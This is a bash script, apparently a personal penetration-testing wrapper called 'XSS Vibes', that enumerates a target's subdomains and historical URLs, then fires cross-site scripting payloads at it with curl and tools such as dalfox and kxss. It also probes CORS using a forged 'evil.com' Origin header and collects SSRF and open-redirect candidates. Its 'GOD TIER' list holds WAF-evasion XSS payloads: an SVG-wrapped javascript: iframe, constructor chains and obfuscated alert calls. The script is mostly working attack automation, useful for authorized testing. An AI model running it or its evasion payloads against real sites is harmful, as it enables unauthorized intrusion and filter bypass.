#!/bin/bash

# XSS Vibes - Ultimate Testing Suite
# Comprehensive vulnerability testing with all advanced features

echo "🔥 XSS Vibes - Ultimate Testing Suite"
echo "======================================="

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
TARGET=""
WAF_TYPE=""
TEST_MODE="comprehensive"
OUTPUT_DIR="xss_vibes_test_$(date +%Y%m%d_%H%M%S)"

# Usage function
usage() {
    echo "Usage: $0 -t <target> [-w waf_type] [-m mode] [-o output_dir]"
    echo ""
    echo "Options:"
    echo "  -t target     Target URL or domain (required)"
    echo "  -w waf_type   WAF type (cloudflare, akamai, imperva, aws, generic)"
    echo "  -m mode       Test mode (quick, comprehensive, god_tier)"
    echo "  -o output     Output directory (default: auto-generated)"
    echo ""
    echo "Examples:"
    echo "  $0 -t testphp.vulnweb.com -w cloudflare -m god_tier"
    echo "  $0 -t demo.testfire.net -m comprehensive"
    echo ""
    exit 1
}

# Parse command line arguments
while getopts "t:w:m:o:h" opt; do
    case $opt in
        t) TARGET="$OPTARG" ;;
        w) WAF_TYPE="$OPTARG" ;;
        m) TEST_MODE="$OPTARG" ;;
        o) OUTPUT_DIR="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

# Validate required parameters
if [ -z "$TARGET" ]; then
    echo -e "${RED}❌ Error: Target is required${NC}"
    usage
fi

# Set defaults
if [ -z "$WAF_TYPE" ]; then
    WAF_TYPE="generic"
fi

echo -e "${CYAN}🎯 Target: $TARGET${NC}"
echo -e "${CYAN}🛡️ WAF Type: $WAF_TYPE${NC}"
echo -e "${CYAN}🧪 Test Mode: $TEST_MODE${NC}"
echo -e "${CYAN}📁 Output Directory: $OUTPUT_DIR${NC}"
echo

# Create output directory
mkdir -p "$OUTPUT_DIR"
cd "$OUTPUT_DIR"

# Function to log results
log_result() {
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] $1" >> test.log
    echo "$1"
}

# Function to check service availability
check_services() {
    echo -e "${YELLOW}🔍 Checking service availability...${NC}"
    
    if command -v xss-service >/dev/null 2>&1; then
        xss-service > service_status.json 2>/dev/null
        
        if [ -f service_status.json ]; then
            echo -e "${GREEN}✅ Service status saved to service_status.json${NC}"
        fi
    elif [ -f "/home/jarek/xss_vibes/service_checker.py" ]; then
        python3 "/home/jarek/xss_vibes/service_checker.py" > service_status.json 2>/dev/null
        
        if [ -f service_status.json ]; then
            echo -e "${GREEN}✅ Service status saved to service_status.json${NC}"
        fi
    else
        echo -e "${YELLOW}⚠️ Service checker not available${NC}"
    fi
}

# Function to run reconnaissance
run_reconnaissance() {
    echo -e "${BLUE}🕵️ Running reconnaissance on $TARGET...${NC}"
    
    # Subdomain enumeration
    log_result "🔍 Starting subdomain enumeration"
    if command -v subfinder >/dev/null 2>&1; then
        subfinder -d "$TARGET" -silent > subdomains.txt 2>/dev/null
        log_result "📋 Found $(wc -l < subdomains.txt) subdomains"
    fi
    
    # URL discovery
    log_result "🔗 Starting URL discovery"
    if command -v waybackurls >/dev/null 2>&1; then
        echo "$TARGET" | waybackurls | head -1000 > wayback_urls.txt 2>/dev/null
        log_result "📋 Found $(wc -l < wayback_urls.txt) historical URLs"
    fi
    
    if command -v gau >/dev/null 2>&1; then
        echo "$TARGET" | gau | head -1000 > gau_urls.txt 2>/dev/null
        log_result "📋 Found $(wc -l < gau_urls.txt) URLs from GAU"
    fi
    
    # Combine and deduplicate URLs
    cat wayback_urls.txt gau_urls.txt 2>/dev/null | sort -u > all_urls.txt
    log_result "📋 Total unique URLs: $(wc -l < all_urls.txt)"
}

# Function to run GOD TIER payload testing
run_god_tier_testing() {
    echo -e "${PURPLE}🔥 Running GOD TIER payload testing...${NC}"
    
    # Try global command first, then absolute path
    if command -v xss-encoder >/dev/null 2>&1; then
        # Generate encoded payloads for this WAF
        log_result "🧬 Generating WAF-specific payloads for $WAF_TYPE"
        xss-encoder "<script>alert(1)</script>" "$WAF_TYPE" > encoded_payloads.txt 2>/dev/null
    elif [ -f "/home/jarek/xss_vibes/advanced_encoder.py" ]; then
        # Generate encoded payloads for this WAF
        log_result "🧬 Generating WAF-specific payloads for $WAF_TYPE"
        python3 "/home/jarek/xss_vibes/advanced_encoder.py" "<script>alert(1)</script>" "$WAF_TYPE" > encoded_payloads.txt 2>/dev/null
    fi
        
    # Test with multiple payloads
    GOD_TIER_PAYLOADS=(
        "𒀀='',𒉺=!𒀀+𒀀"
        "ale‌rt(1)"
        "constructor[constructor](alert(1))()"
        '<svg><use href="#x"></use><symbol id="x"><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></symbol></svg>'
        "\${alert(1)}"
        "</style><script>alert(1)</script>"
        "data:text/html,<script>alert(1)</script>"
    )
    
    echo "🧪 Testing GOD TIER payloads against $TARGET" > god_tier_results.txt
    echo "=============================================" >> god_tier_results.txt
    
    for payload in "${GOD_TIER_PAYLOADS[@]}"; do
        log_result "🎯 Testing GOD TIER payload: ${payload:0:50}..."
        
        # Generate encoded variants
        if command -v xss-encoder >/dev/null 2>&1; then
            xss-encoder "$payload" "$WAF_TYPE" >> god_tier_results.txt 2>/dev/null
        elif [ -f "/home/jarek/xss_vibes/advanced_encoder.py" ]; then
            python3 "/home/jarek/xss_vibes/advanced_encoder.py" "$payload" "$WAF_TYPE" >> god_tier_results.txt 2>/dev/null
        fi
        
        # Test basic reflection
        encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
        response=$(curl -s --max-time 10 "http://$TARGET/?test=$encoded_payload" 2>/dev/null)
        
        if echo "$response" | grep -q "alert\|script\|svg\|constructor\|𒀀\|ale.*rt"; then
            echo "✅ REFLECTED: $payload" >> god_tier_results.txt
            log_result "✅ GOD TIER payload reflected!"
        else
            echo "❌ BLOCKED: $payload" >> god_tier_results.txt
        fi
        
        sleep 1  # Rate limiting
    done
}

# Function to run comprehensive vulnerability testing
run_comprehensive_testing() {
    echo -e "${GREEN}🧪 Running comprehensive vulnerability testing...${NC}"
    
    # XSS Testing
    log_result "🚨 Starting XSS testing"
    if [ -f "all_urls.txt" ] && command -v qsreplace >/dev/null 2>&1; then
        cat all_urls.txt | grep "=" | qsreplace "FUZZ" | head -100 > xss_targets.txt
        
        if command -v dalfox >/dev/null 2>&1; then
            dalfox file xss_targets.txt --silence --no-color --output xss_results.txt &
            DALFOX_PID=$!
        fi
        
        if command -v kxss >/dev/null 2>&1; then
            cat xss_targets.txt | kxss > kxss_results.txt &
            KXSS_PID=$!
        fi
    fi
    
    # SQL Injection Testing
    log_result "💉 Starting SQL injection testing"
    if [ -f "all_urls.txt" ] && command -v sqlmap >/dev/null 2>&1; then
        head -20 all_urls.txt | grep "=" > sqli_targets.txt
        # Note: sqlmap would be run manually for legal/ethical reasons
        echo "SQLi targets saved to sqli_targets.txt for manual testing" > sqli_results.txt
    fi
    
    # CORS Testing
    log_result "🌐 Starting CORS testing"
    if [ -f "subdomains.txt" ]; then
        while read -r subdomain; do
            if [ ! -z "$subdomain" ]; then
                response=$(curl -s -H "Origin: https://evil.com" -I "http://$subdomain" 2>/dev/null)
                if echo "$response" | grep -q "Access-Control-Allow-Origin: https://evil.com"; then
                    echo "⚠️ CORS misconfiguration: $subdomain" >> cors_results.txt
                fi
            fi
        done < subdomains.txt
    fi
    
    # SSRF Testing
    log_result "🔗 Starting SSRF testing"
    if [ -f "all_urls.txt" ]; then
        grep -E "(url=|redirect=|callback=)" all_urls.txt | head -20 > ssrf_targets.txt
        echo "SSRF targets saved to ssrf_targets.txt for manual testing" > ssrf_results.txt
    fi
    
    # Open Redirect Testing
    log_result "↗️ Starting open redirect testing"
    if [ -f "all_urls.txt" ]; then
        grep -E "(redirect=|url=|next=|return=)" all_urls.txt | head -20 > redirect_targets.txt
        echo "Open redirect targets saved to redirect_targets.txt for manual testing" > redirect_results.txt
    fi
    
    # Wait for background processes
    if [ ! -z "$DALFOX_PID" ]; then
        wait $DALFOX_PID
    fi
    if [ ! -z "$KXSS_PID" ]; then
        wait $KXSS_PID
    fi
}

# Function to run quick testing
run_quick_testing() {
    echo -e "${YELLOW}⚡ Running quick testing...${NC}"
    
    # Quick XSS test
    log_result "⚡ Quick XSS test"
    test_payload="<script>alert(1)</script>"
    encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$test_payload'))")
    response=$(curl -s --max-time 5 "http://$TARGET/?test=$encoded_payload" 2>/dev/null)
    
    if echo "$response" | grep -q "<script>"; then
        log_result "✅ Basic XSS payload reflected"
        echo "✅ Basic XSS reflection detected" > quick_results.txt
    else
        log_result "❌ Basic XSS payload blocked"
        echo "❌ Basic XSS blocked" > quick_results.txt
    fi
    
    # Quick CORS test
    log_result "⚡ Quick CORS test"
    response=$(curl -s -H "Origin: https://evil.com" -I "http://$TARGET" 2>/dev/null)
    if echo "$response" | grep -q "Access-Control-Allow-Origin"; then
        log_result "⚠️ CORS headers detected"
        echo "⚠️ CORS headers present" >> quick_results.txt
    fi
}

# Function to generate comprehensive report
generate_report() {
    echo -e "${CYAN}📊 Generating comprehensive report...${NC}"
    
    {
        echo "🔥 XSS Vibes - Ultimate Testing Report"
        echo "======================================"
        echo "Target: $TARGET"
        echo "WAF Type: $WAF_TYPE"
        echo "Test Mode: $TEST_MODE"
        echo "Date: $(date)"
        echo ""
        
        echo "📋 Test Summary:"
        echo "================"
        
        if [ -f "subdomains.txt" ]; then
            echo "🔍 Subdomains found: $(wc -l < subdomains.txt)"
        fi
        
        if [ -f "all_urls.txt" ]; then
            echo "🔗 URLs discovered: $(wc -l < all_urls.txt)"
        fi
        
        if [ -f "xss_results.txt" ]; then
            echo "🚨 XSS results: $(wc -l < xss_results.txt) findings"
        fi
        
        if [ -f "god_tier_results.txt" ]; then
            echo "🔥 GOD TIER results: $(grep -c "REFLECTED" god_tier_results.txt 2>/dev/null || echo 0) reflected payloads"
        fi
        
        echo ""
        echo "📁 Generated Files:"
        echo "=================="
        ls -la *.txt *.json 2>/dev/null | while read line; do echo "📄 $line"; done
        
        echo ""
        echo "🛡️ Security Recommendations:"
        echo "============================="
        echo "1. 🔍 Review all reflected payloads manually"
        echo "2. 🧪 Test GOD TIER payloads in controlled environment"
        echo "3. 🛡️ Implement proper input validation"
        echo "4. 🔄 Regular security testing recommended"
        echo "5. 📊 Monitor for new vulnerability patterns"
        
    } > ultimate_report.txt
    
    log_result "📊 Report saved to ultimate_report.txt"
}

# Main execution flow
echo -e "${GREEN}🚀 Starting Ultimate Testing Suite...${NC}"

# Check tool availability
log_result "🔧 Checking tool availability"
echo "Tool availability:" > tool_status.txt
for tool in subfinder waybackurls gau qsreplace dalfox kxss httpx nuclei; do
    if command -v "$tool" >/dev/null 2>&1; then
        echo "✅ $tool: available" >> tool_status.txt
    else
        echo "❌ $tool: not available" >> tool_status.txt
    fi
done

# Run tests based on mode
case "$TEST_MODE" in
    "quick")
        check_services
        run_quick_testing
        ;;
    "comprehensive")
        check_services
        run_reconnaissance
        run_comprehensive_testing
        ;;
    "god_tier")
        check_services
        run_reconnaissance
        run_god_tier_testing
        run_comprehensive_testing
        ;;
    *)
        echo -e "${RED}❌ Unknown test mode: $TEST_MODE${NC}"
        exit 1
        ;;
esac

# Generate final report
generate_report

echo
echo -e "${GREEN}🏆 Ultimate Testing Complete!${NC}"
echo -e "${CYAN}📁 Results saved to: $PWD${NC}"
echo -e "${YELLOW}⚠️ Remember: Only test on authorized targets!${NC}"

# Display quick summary
if [ -f "ultimate_report.txt" ]; then
    echo
    echo -e "${BLUE}📊 Quick Summary:${NC}"
    grep -E "🔍|🔗|🚨|🔥" ultimate_report.txt | head -10
fi
